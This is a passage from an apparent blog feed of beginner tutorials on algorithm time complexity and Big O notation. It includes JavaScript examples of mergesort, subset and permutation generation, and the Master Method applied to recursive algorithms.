<p>O(n<sup>log<sub>b</sub>a</sup> log(n))</p>
</blockquote>
<p>Making the substitution we get:</p>
<p>O(n<sup>log<sub>2</sub>1</sup> log(n))</p>
<p>O(n<sup>0</sup> log(n))</p>
<p>O(log(n))  <strong>üëà this is running time of a binary search</strong></p>
<!--

https://www.youtube.com/watch?v=6CX7s7JnXs0 - Master Method ( incl. Step-By-Step Guide and Examples ) - Analysis

https://stackoverflow.com/questions/tagged/big-o?sort=votes&pageSize=20

https://mauriciopoppe.github.io/function-plot/

https://www.topcoder.com/community/data-science/data-science-tutorials/binary-search/

https://stackoverflow.com/questions/tagged/algorithm
https://stackoverflow.com/questions/tagged/data-structures
https://math.stackexchange.com/questions/tagged/recursive-algorithms+algorithms

https://stackoverflow.com/q/13467674/684957
https://en.wikipedia.org/wiki/Master_theorem_(analysis_of_algorithms) -->
<h1 id="O-n-log-n-Linearithmic">O(n log n) - Linearithmic<a href="#O-n-log-n-Linearithmic" class="headerlink" title="O(n log n) - Linearithmic"></a></h1><p>Linearithmic time complexity it‚Äôs slightly slower than a linear algorithm but still much better than a quadratic algorithm (you will see a graph at the very end of the post).</p>
<h2 id="Mergesort">Mergesort<a href="#Mergesort" class="headerlink" title="Mergesort"></a></h2><p>What‚Äôs the best way to sort an array?  Before, we proposed a solution using bubble sort that has a time complexity of O(n^2). Can we do better?</p>
<p>We can use an algorithm called <code>mergesort</code> to improve it:</p>
<ol>
<li>We are going to divide the array recursively until the elements are two or less.</li>
<li>We know how to sort 2 items, so we sort them iteratively (base case).</li>
<li>The final step is merging: we merge in taking one by one from each array such that they are in ascending order.</li>
</ol>
<p>Here‚Äôs the code for merge sort:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sort</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> length = n.length;</span><br><span class="line">  <span class="comment">// base case</span></span><br><span class="line">  <span class="keyword">if</span>(length === <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(length === <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> n[<span class="number">0</span>] &gt; n[<span class="number">1</span>] ? [n[<span class="number">1</span>], n[<span class="number">0</span>]] : [n[<span class="number">0</span>], n[<span class="number">1</span>]];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// slit and merge</span></span><br><span class="line">  <span class="keyword">const</span> mid = length/<span class="number">2</span>;</span><br><span class="line">  <span class="keyword">return</span> merge(sort(n.slice(<span class="number">0</span>, mid)), sort(n.slice(mid)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">a = [], b = []</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> merged = [];</span><br><span class="line">  <span class="comment">// merge elements on a and b in asc order. Run-time O(a + b)</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> ai = <span class="number">0</span>, bi = <span class="number">0</span>; ai &lt; a.length || bi &lt; b.length;) &#123;</span><br><span class="line">    <span class="keyword">if</span>(ai &gt;= a.length || a[ai] &gt; b[bi]) &#123;</span><br><span class="line">      merged.push(b[bi++]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      merged.push(a[ai++]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> merged;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>As you can see, it has two functions <code>sort</code> and <code>merge</code>. Merge is an auxiliary function that runs once through the collection <code>a</code> and <code>b</code>, so it‚Äôs running time is O(n). Let‚Äôs apply the Master Method to find the running time.</p>
<h2 id="Mater-Method-for-Mergesort">Mater Method for Mergesort<a href="#Mater-Method-for-Mergesort" class="headerlink" title="Mater Method for Mergesort"></a></h2><p>We are going to apply the <a href="#Master-Method-for-recursive-algorithms">Master Method that we explained above</a> to find the runtime:</p>
<p>1) Let‚Äôs find the values of: <code>T(n) = a T(n/b) + f(n)</code></p>
<ul>
<li><code>a</code>: The number of sub-problems is 2 (line 12). So, <code>a = 2</code>.</li>
<li><code>b</code>: Each of the sub-problems divides <code>n</code> in half. So, <code>b = 2</code></li>
<li><code>f(n)</code>: The work done outside the recursion is the function <code>merge</code>, which has a runtime of <code>O(n)</code> since it visits all the elements on the given arrays.</li>
</ul>
<p>Substituting the values:</p>
<blockquote>
<p>T(n) = 2 T(n/2) + O(n)</p>
</blockquote>
<p>2) Let‚Äôs find the work done in the recursion: <code>n<sup>log<sub>b</sub>a</sup></code>.</p>
<p>n<sup>log<sub>2</sub>2</sup></p>
<p>n<sup>1</sup> = n</p>
<p>3) Finally, we can see that recursion runtime from step 2) is O(n) and also the non-recursion runtime is O(n). So, we have the <a href="#Case-2-The-runtime-of-the-work-done-in-the-recursion-and-outside-is-the-same"> case 2 </a>: <code><i>O(n<sup>log<sub>b</sub>a</sup> log(n))</i></code></p>
<p><i>O(n<sup>log<sub>2</sub>2</sup> log(n))</i></p>
<p><i>O(n<sup>1</sup> log(n))</i></p>
<p><i>O(n log(n))</i> <strong>üëà this is running time of the merge sort</strong></p>
<h1 id="O-2-n-Exponential-time">O(2^n) - Exponential time<a href="#O-2-n-Exponential-time" class="headerlink" title="O(2^n) - Exponential time"></a></h1><p>Exponential (base 2) running time means that the calculations performed by an algorithm double every time as the input grows.</p>
<h2 id="Subsets-of-a-Set">Subsets of a Set<a href="#Subsets-of-a-Set" class="headerlink" title="Subsets of a Set"></a></h2><p>Finding all distinct subsets of a given set. For instance, let‚Äôs do some examples to try to come up with an algorithm to solve it:
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getSubsets(<span class="string">''</span>) <span class="comment">// =&gt;  ['']</span></span><br><span class="line">getSubsets(<span class="string">'a'</span>) <span class="comment">// =&gt; ['', 'a']</span></span><br><span class="line">getSubsets(<span class="string">'ab'</span>) <span class="comment">// =&gt; ['', 'a', 'b', 'ab']</span></span><br></pre></td></tr></table></figure></p>
<p>Did you notice any pattern?</p>
<ul>
<li>The first returns have an empty element.</li>
<li>The second case returns the empty element + the 1st element.</li>
<li>The 3rd case returns precisely the results of 2nd case + the same array with the 2nd element <code>b</code> appended to it.</li>
</ul>
<p>What if you want to find the subsets of <code>abc</code>? Well, it would be exactly the subsets of ‚Äòab‚Äô and again the subsets of <code>ab</code> with <code>c</code> appended at the end of each element.</p>
<p>As you noticed, every time the input gets longer the output is twice as long as the previous one. Let‚Äôs code it op:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSubsets</span>(<span class="params">n = <span class="string">''</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> array = <span class="built_in">Array</span>.from(n);</span><br><span class="line">  <span class="keyword">const</span> base = [<span class="string">''</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> results = array.reduce(<span class="function">(<span class="params">previous, element</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> previousPlusElement = previous.map(<span class="function"><span class="params">el</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;el&#125;</span><span class="subst">$&#123;element&#125;</span>`</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> previous.concat(previousPlusElement);</span><br><span class="line">  &#125;, base);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`getSubsets(<span class="subst">$&#123;n&#125;</span>) // <span class="subst">$&#123;results.slice(<span class="number">0</span>, <span class="number">15</span>).join(<span class="string">', '</span>)&#125;</span>... `</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`n: <span class="subst">$&#123;array.length&#125;</span>, counter: <span class="subst">$&#123;results.length&#125;</span>;`</span>);</span><br><span class="line">  <span class="keyword">return</span> results;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>If we run that function for a couple of cases we will get:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">getSubsets(<span class="string">''</span>) <span class="comment">// ...</span></span><br><span class="line"><span class="comment">// n = 0, f(n) = 1;</span></span><br><span class="line">getSubsets(<span class="string">'a'</span>) <span class="comment">// , a...</span></span><br><span class="line"><span class="comment">// n = 1, f(n) = 2;</span></span><br><span class="line">getSubsets(<span class="string">'ab'</span>) <span class="comment">// , a, b, ab...</span></span><br><span class="line"><span class="comment">// n = 2, f(n) = 4;</span></span><br><span class="line">getSubsets(<span class="string">'abc'</span>) <span class="comment">// , a, b, ab, c, ac, bc, abc...</span></span><br><span class="line"><span class="comment">// n = 3, f(n) = 8;</span></span><br><span class="line">getSubsets(<span class="string">'abcd'</span>) <span class="comment">// , a, b, ab, c, ac, bc, abc, d, ad, bd, abd, cd, acd, bcd...</span></span><br><span class="line"><span class="comment">// n = 4, f(n) = 16;</span></span><br><span class="line">getSubsets(<span class="string">'abcde'</span>) <span class="comment">// , a, b, ab, c, ac, bc, abc, d, ad, bd, abd, cd, acd, bcd...</span></span><br><span class="line"><span class="comment">// n = 5, f(n) = 32;</span></span><br></pre></td></tr></table></figure>
<p>As expected, if you plot <code>n</code> and <code>f(n)</code>, you will notice that it would be exactly like the function <code>2^n</code>. This algorithm has a running time of <code>O(2^n)</code>.</p>
<p><strong>Note:</strong> You should avoid functions with exponential running times (if possible) since they don‚Äôt scale well. The time it takes to process the output doubles with every additional input size. But exponential running time is not the worst yet; there are others that go even slower. Let‚Äôs see one more example in the next section.</p>
<h1 id="O-n-Factorial-time">O(n!) - Factorial time<a href="#O-n-Factorial-time" class="headerlink" title="O(n!) - Factorial time"></a></h1><p>Factorial is the multiplication of all positive integer numbers less than itself. For instance:</p>
<blockquote>
<p>5! = 5 x 4 x 3 x 2 x 1 = 120</p>
</blockquote>
<p>It grows pretty quickly:</p>
<blockquote>
<p>20! = 2,432,902,008,176,640,000</p>
</blockquote>
<p>As you might guess, you want to stay away if possible from algorithms that have this running time!</p>
<h2 id="Permutations">Permutations<a href="#Permutations" class="headerlink" title="Permutations"></a></h2><p>Write a function that computes all the different words that can be formed given a string. E.g.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getPermutations(<span class="string">'a'</span>) <span class="comment">// =&gt; [ 'a']</span></span><br><span class="line">getPermutations(<span class="string">'ab'</span>) <span class="comment">// =&gt;  [ 'ab', 'ba']</span></span><br><span class="line">getPermutations(<span class="string">'abc'</span>) <span class="comment">// =&gt; [ 'abc', 'acb', 'bac', 'bca', 'cab', 'cba' ]</span></span><br></pre></td></tr></table></figure>
<p>How would you solve that?</p>
<p>A straightforward way will be to check if the string has a length of 1 if so, return that string since you can‚Äôt arrange it differently.</p>
<p>For strings with a length bigger than 1, we could use recursion to divide the problem into smaller problems until we get to the length 1 case. We can take out the first character and solve the problem for the remainder of the string until we have a length of 1.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPermutations</span>(<span class="params">string, prefix = <span class="string">''</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(string.length &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> [prefix + string];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Array</span>.from(string).reduce(<span class="function">(<span class="params">result, char, index</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> reminder = string.slice(<span class="number">0</span>, index) + string.slice(index+<span class="number">1</span>);</span><br><span class="line">    result = result.concat(getPermutations(reminder, prefix + char));</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;, []);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>If print out the output, it would be something like this:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">getPermutations(<span class="string">'ab'</span>) <span class="comment">// ab, ba...</span></span><br><span class="line"><span class="comment">// n = 2, f(n) = 2;</span></span><br><span class="line">getPermutations(<span class="string">'abc'</span>) <span class="comment">// abc, acb, bac, bca, cab, cba...</span></span><br><span class="line"><span class="comment">// n = 3, f(n) = 6;</span></span><br><span class="line">getPermutations(<span class="string">'abcd'</span>) <span class="comment">// abcd, abdc, acbd, acdb, adbc, adcb, bacd...</span></span><br><span class="line"><span class="comment">// n = 4, f(n) = 24;</span></span><br><span class="line">getPermutations(<span class="string">'abcde'</span>) <span class="comment">// abcde, abced, abdce, abdec, abecd, abedc, acbde...</span></span><br><span class="line"><span class="comment">// n = 5, f(n) = 120;</span></span><br></pre></td></tr></table></figure>
<p>I tried with an string with a length of 10. It took around 8 seconds!</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">time node ./lib/permutations.js</span><br><span class="line"><span class="comment"># getPermutations('abcdefghij') // =&gt; abcdefghij, abcdefghji, abcdefgihj, abcdefgijh, abcdefgjhi, abcdefgjih, abcdefhgij...</span></span><br><span class="line"><span class="comment"># // n = 10, f(n) = 3,628,800;</span></span><br><span class="line"><span class="comment"># ./lib/permutations.js  8.06s user 0.63s system 101% cpu 8.562 total</span></span><br></pre></td></tr></table></figure>
<p>I have a little homework for you‚Ä¶</p>
<blockquote>
<p>Can you try with a permutation with 11 characters? ;) Comment below what happened to your computer!</p>
</blockquote>
<h1 id="All-running-complexities-graphs">All running complexities graphs<a href="#All-running-complexities-graphs" class="headerlink" title="All running complexities graphs"></a></h1><p>We explored the most common algorithms running times with one or two examples each! They should give you an idea of how to calculate your running times when developing your projects. Below you can find a chart with a graph of all the time complexities that we covered:</p>
<img src="/images/big-o-running-time-complexity.png" title="Big o running time complexities">
<p>Mind your time complexity!</p>
<!-- Backlinks and references -->
<!-- https://www.reddit.com/r/compsci/comments/8hwozu/8_time_complexities_that_every_programmer_should/ -->
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Summary&quot;&gt;Summary&lt;a href=&quot;#Summary&quot; class=&quot;headerlink&quot; title=&quot;Summary&quot;&gt;&lt;/a&gt;&lt;/h1&gt;&lt;p&gt;We are going to learn the top algorithm‚Äôs running time that every developer should be familiar with. Knowing these time complexities will help you to assess if your code will scale. Also, it‚Äôs handy to compare different solutions for the same problem. At the end, you would be able to estimate which one will perform better.&lt;/p&gt;
    
    </summary>
    
      <category term="Programming" scheme="https://adrianmejia.com/categories/Programming/"/>
    
      <category term="Data Structures and Algorithms (DSA)" scheme="https://adrianmejia.com/categories/Programming/Data-Structures-and-Algorithms-DSA/"/>
    
    
      <category term="big-o notation" scheme="https://adrianmejia.com/tags/big-o-notation/"/>
    
      <category term="algorithms" scheme="https://adrianmejia.com/tags/algorithms/"/>
    
      <category term="tutorial_algorithms" scheme="https://adrianmejia.com/tags/tutorial-algorithms/"/>
    
  </entry>
  
  <entry>
    <title>How you can change the world by learning Data Structures and Algorithms</title>
    <link href="https://adrianmejia.com/blog/2018/04/04/how-you-can-change-the-world-learning-data-structures-algorithms-free-online-course-tutorial/"/>
    <id>https://adrianmejia.com/blog/2018/04/04/how-you-can-change-the-world-learning-data-structures-algorithms-free-online-course-tutorial/</id>
    <published>2018-04-04T20:16:07.000Z</published>
    <updated>2019-02-21T23:21:03.330Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML" async></script>

<p>As a developer, you have the power to change the world! You can write programs that enable new technologies and work in software to find an earlier diagnosis of diseases for instance. Also, you might create a project to free up people‚Äôs time to do other amazing things. Whatever you do, it has the potential to impact the community who use it.</p>
<!-- Millions of people might use some applications (e.g., Google,
Baidu, Youtube, Facebook). -->
<p>However, these accomplishments are only possible if we write software that is fast and can scale. Learning how to measure your code performance is the goal of this online course.</p>
<a id="more"></a>
<hr>
<p>This post is part of a tutorial series:</p>
<p><strong>Learning Data Structures and Algorithms (DSA) for Beginners</strong></p>
<ol>
<li><p>Intro to Algorithm‚Äôs Time Complexity and Big O Notation <strong>üëà you are here</strong></p>
<!-- 1. [Intro to algorithm's time complexity and Big O notation](/blog/2018/04/04/how-you-can-change-the-world-learning-data-structures-algorithms-free-online-course-tutorial/) -->
</li>
<li><p><a href="/blog/2018/04/05/most-popular-algorithms-time-complexity-every-programmer-should-know-free-online-tutorial-course/">Eight-time complexities that every programmer should know</a></p>
<!-- 1. Eight time complexities that every programmer should know **üëà you are here** -->
</li>
<li><p><a href="/blog/2018/04/28/Data-Structures-Time-Complexity-for-Beginners-Arrays-HashMaps-Linked-Lists-Stacks-Queues-tutorial/">Data Structures for Beginners: Arrays, HashMaps, and Lists</a></p>
<!-- 1. Data Structures for Beginners: Arrays, HashMaps, and Lists **üëà you are here** -->
</li>
<li><p><a href="/blog/2018/05/14/Data-Structures-for-Beginners-Graphs-Time-Complexity-tutorial/">Graph Data Structures for Beginners</a></p>
<!-- 1. Graph Data Structures for Beginners **üëà you are here** -->
</li>
<li><p><a href="/blog/2018/06/11/Data-Structures-for-Beginners-Trees-binary-search-tree-tutorial/">Trees Data Structures for Beginners</a></p>
<!-- 1. Trees Data Structures for Beginners **üëà you are here** -->
</li>
<li><p><a href="/blog/2018/07/16/self-balanced-binary-search-trees-with-avl-tree-data-structure-for-beginners/">Self-balanced Binary Search Trees</a></p>
<!-- 1. Self-balanced Binary Search Trees  **üëà you are here** -->
</li>
<li><p><a href="/blog/2018/04/24/Analysis-of-Recursive-Algorithms/">Appendix I: Analysis of Recursive Algorithms</a></p>
<!-- 1. Appendix I: Analysis of Recursive Algorithms **üëà you are here** -->
</li>
</ol>
<hr>
<p>We are going to explore how you can measure your code performance using analysis of algorithms: <strong>time complexity</strong> and <strong>big O notation</strong>.</p>
<p>First, let‚Äôs see a real story to learn why this is important.</p>
<h1 id="An-algorithm-that-saved-millions-of-lives">An algorithm that saved millions of lives<a href="#An-algorithm-that-saved-millions-of-lives" class="headerlink" title="An algorithm that saved millions of lives"></a></h1><p>During War World II the Germans used <abbr title="AM broadcasting is a radio broadcasting technology, which employs amplitude modulation transmissions.">AM</abbr> radio signals to communicate with troops around Europe. Anybody with an AM frecuency radio and some knowledge of Morse code could intercept the message. However, the information was encoded! All the countries that were under attack tried to decode it. Sometimes, they got lucky and were able to make sense of a couple of messages at the end of the day. Unfortunately, The Nazis changed the encoding every single day!</p>
<p>A math genius called Alan Turing joined the British military to crack the German ‚ÄúEnigma‚Äù code. He knew they would never get ahead if they keep doing the calculations by pen and paper. So after many months of hard work, they built a machine. Unfortunately, It took more than a day to decode a message! So, it was useless :((((</p>
<p>Alan‚Äôs team found out that every encrypted message ended with the same string: ‚ÄúHeil Hitler‚Äù Aha! After changing the algorithm, the machine was able to decoded in minutes rather than days! They used it the info to finish the war faster and save millions of lives!</p>
<blockquote>
<p>The same machine that was going to get shut down as a failure became a live saver. Likewise, you can do way more with your computing resources when you write efficient code. That is what we are going to learn in this course!</p>
</blockquote>
<p>Another popular algorithm is <code>PageRank</code> developed in 1998 by Sergey Brin and Larry Page (Google founders). This was (and is) used by a Google search engine to make sense of trillions of web pages. Google was not the only search engine, however, since their algorithm returned better results, eventually, most of the competitors faded away at the time. Today it powers most of 3 billion daily searches very quickly. That is the power of algorithms that scale! üèãüèª‚Äç</p>
<h1 id="So-why-should-you-learn-to-write-efficient-algorithms">So, why should you learn to write efficient algorithms?<a href="#So-why-should-you-learn-to-write-efficient-algorithms" class="headerlink" title="So, why should you learn to write efficient algorithms?"></a></h1><p>There are many advantages; these are just some of them:</p>
<ul>
<li>You would become a much better software developer (and get better jobs/income).</li>
<li>Spend less time debugging, optimizing and re-writing code.</li>
<li>Your software will run faster with the same hardware (cheaper to scale).</li>
<li>Your programs might be used to aid discoveries that save millions of lives.</li>
<li>Outperform competitors!</li>
</ul>
<p>Without further ado, let‚Äôs step up our game!</p>
<h1 id="What-are-algorithms">What are algorithms?<a href="#What-are-algorithms" class="headerlink" title="What are algorithms?"></a></h1><p>Algorithms (as you might know) are steps of how to do some task. For example, when you cook, you follow a <strong>recipe</strong> to prepare a dish. If you play a game, you are devising <strong>strategies</strong> to help you win. Likewise, algorithms in computers are a set of instructions used to solve a problem.</p>
<blockquote>
<p>Algorithms are instructions to perform a task</p>
</blockquote>
<p>There are ‚Äúgood‚Äù and ‚Äúbad‚Äù algorithms. The good ones are fast; the bad ones are slow. Slow algorithms cost more money and make some calculations impossible in our lifespan!</p>
<p>We are going to explore the basic concepts of algorithms. Also, we are going to learn how to distinguish ‚Äúfast‚Äù from ‚Äúslow‚Äù ones. Even better, you will be able to ‚Äúmeasure‚Äù the performance of your algorithms and improve them!</p>
<h1 id="How-to-improve-your-coding-skills">How to improve your coding skills?<a href="#How-to-improve-your-coding-skills" class="headerlink" title="How to improve your coding skills?"></a></h1><p>The first step to improving something is to measure it.</p>
<blockquote><p>Measurement is the first step that leads to control and eventually to improvement. If you can‚Äôt measure something, you can‚Äôt understand it. If you can‚Äôt understand it, you can‚Äôt control it. If you can‚Äôt control it, you can‚Äôt improve it.</p>
<footer><strong>H. J. Harrington</strong></footer></blockquote>
<p>How do you do ‚Äúmeasure‚Äù your code? Would you clock ‚Äúhow long‚Äù it takes to run? What if you are running the same program on a mobile device or a quantum computer? The same code will give you different results, right?</p>
<p>To answer these questions, we need to nail some concepts first, like <strong>time complexity</strong>!</p>
<h2 id="Time-complexity">Time complexity<a href="#Time-complexity" class="headerlink" title="Time complexity"></a></h2><p>Time complexity (or <strong>running time</strong>) is the estimated time an algorithm takes to run. However, you do not measure time complexity in seconds, but as a <strong>function</strong> of the input.  (I know it‚Äôs weird but bear with me).</p>
<blockquote>
<p>The <strong>time complexity</strong> is not about timing how long the algorithm takes. Instead, <em>how many operations</em> are executed. The number of instructions executed by a program is affected by the size of the input and how their elements are arranged.</p>
</blockquote>
<p>Why is that the time complexity is expressed as a function of the input? Well, let‚Äôs say you want to sort an array of numbers. If the elements are already sorted, the program will perform fewer operations. On the contrary, if the items are in reverse order, it will require more time to get it sorted. So, the time a program takes to execute is directly related to the input size and how the elements are arranged.</p>
<p>We can say for each algorithm have the following running times:</p>
<ul>
<li>Worst-case time complexity (e.g., input elements in reversed order)</li>
<li>Best-case time complexity (e.g., already sorted)</li>
<li>Average-case time complexity (e.g., elements in random order)</li>
</ul>
<p>We usually care more about the <strong>worst-case time complexity</strong>. We are hoping for the best but preparing for the <strong>worst</strong>.</p>
<h1 id="Calculating-time-complexity">Calculating time complexity<a href="#Calculating-time-complexity" class="headerlink" title="Calculating time complexity"></a></h1><p>Here‚Äôs a code example of how you can calculate the time complexity: <em>Find the smallest number in an array</em>.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get the smallest number on an array of numbers</span></span><br><span class="line"><span class="comment"> * @param &#123;Array&#125; n array of numbers</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getMin</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line marked">  <span class="keyword">const</span> array = <span class="built_in">Array</span>.from(n);</span><br><span class="line marked">  <span class="keyword">let</span> min;</span><br><span class="line"></span><br><span class="line">  array.forEach(<span class="function"><span class="params">element</span> =&gt;</span> &#123;</span><br><span class="line marked">    <span class="keyword">if</span>(min === <span class="literal">undefined</span> || element &lt; min) &#123;</span><br><span class="line marked">      min = element;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line marked">  <span class="keyword">return</span> min;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We can represent <code>getMin</code> as a function of the size of the input <code>n</code> based on the number of operations it has to perform. For simplicity, let‚Äôs assume that each line of code takes the same amount of time in the CPU to execute. Let‚Äôs make the sum:</p>
<ul>
<li>Line 6: 1 operation</li>
<li>Line 7: 1 operation</li>
<li>Line 9-13: it is a loop that executes size of <code>n</code> times<ul>
<li>Line 10: 1 operation</li>
<li>Line 11: this one is tricky. It is inside a conditional. We will assume the worst case where the array is sorted in ascending order. The condition (<code>if</code> block) will be executed each time. Thus, 1 operation</li>
</ul>
</li>
<li>Line 14: 1 operation</li>
</ul>
<p>All in all, we have <code>3</code> operations outside the loop and <code>2</code> inside the <code>forEach</code> block. Since the loop goes for the size of <code>n</code>, this leaves us with <code>2(n) + 3</code>.</p>
<p>However, this expression is somewhat too specific and hard to compare algorithms with it. We are going to apply the <strong>asymptotic analysis</strong> to simplify this expression further.</p>
<h2 id="Asymptotic-analysis">Asymptotic analysis<a href="#Asymptotic-analysis" class="headerlink" title="Asymptotic analysis"></a></h2><p>Asymptotic analysis is just evaluating functions as their value approximate to the infinite. In our previous example <code>2(n) + 3</code>, we can generalize it as <code>k(n) + c</code>. As the value of <code>n</code> grows, the value <code>c</code> is less and less significant, as you can see in the following table:</p>
<table>
<thead>
<tr>
<th>n (size)</th>
<th>operations</th>
<th>result</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>2(1) + 3</td>
<td>5</td>
</tr>
<tr>
<td>10</td>
<td>2(10) + 3</td>
<td>23</td>
</tr>
<tr>
<td>100</td>
<td>2(100) + 3</td>
<td>203</td>
</tr>
<tr>
<td>1,000</td>
<td>2(1,000) + 3</td>
<td>2,003</td>
</tr>
<tr>
<td>10,000</td>
<td>2(10,000) + 3</td>
<td>20,003</td>
</tr>
</tbody>
</table>
<p>Believe it or not, also <code>k</code> wouldn‚Äôt make too much of a difference. Using this kind of asymptotic analysis we take the higher order element, in this case: <code>n</code>.</p>
<p>Let‚Äôs do another example so we can get this concept. Let‚Äôs say we have the following function: `3 n^2 + 2n + 20`. What would be the result of using the asymptotic analysis?</p>
<blockquote>
<p>`3 n^2 + 2n + 20` as `n` grows bigger and bigger; the term that will make the most difference is `n^2`.</p>
</blockquote>
<p>Going back to our example, <code>getMin</code>, we can say that this function has a time complexity of <code>n</code>. As you can see, we could approximate it as <code>2(n)</code> and drop the <code>+3</code> since it does not add too much value as `n` keep getting bigger.</p>
<p>We are interested in the big picture here, and we are going to use the asymptotic analysis to help us with that. With this framework, comparing algorithms, it is much more comfortable. We can compare running times with their most significant term: `n^2` or `n` or `2^n`.</p>
<h2 id="Big-O-notation-and-Growth-rate-of-Functions">Big-O notation and Growth rate of Functions<a href="#Big-O-notation-and-Growth-rate-of-Functions" class="headerlink" title="Big-O notation and Growth rate of Functions"></a></h2><p>The Big O notation combines what we learned in the last two sections about <strong>worst-case time complexity</strong> and <strong>asymptotic analysis</strong>.</p>
<blockquote>
<p>The letter `O` refers to the <strong>order</strong> of a function.</p>
</blockquote>
<p>The Big O notation is used to classify algorithms by their worst running time or also referred as the upper bound of the growth rate of a function.</p>
<p>In our previous example with <code>getMin</code> function, we can say it has a running time of <code>O(n)</code>. There are many different running times. Here are the most common that we are going to cover in the next post and their relationship with time:</p>
<p>Growth rates vs. <code>n</code> size:</p>
<div class="table--responsive">

<table>
<thead>
<tr>
<th>n</th>
<th>O(1)</th>
<th>O(log n)</th>
<th>O(n)</th>
<th>O(n log n)</th>
<th>O(n<sup>2</sup>)</th>
<th>O(2<sup>n</sup>)</th>
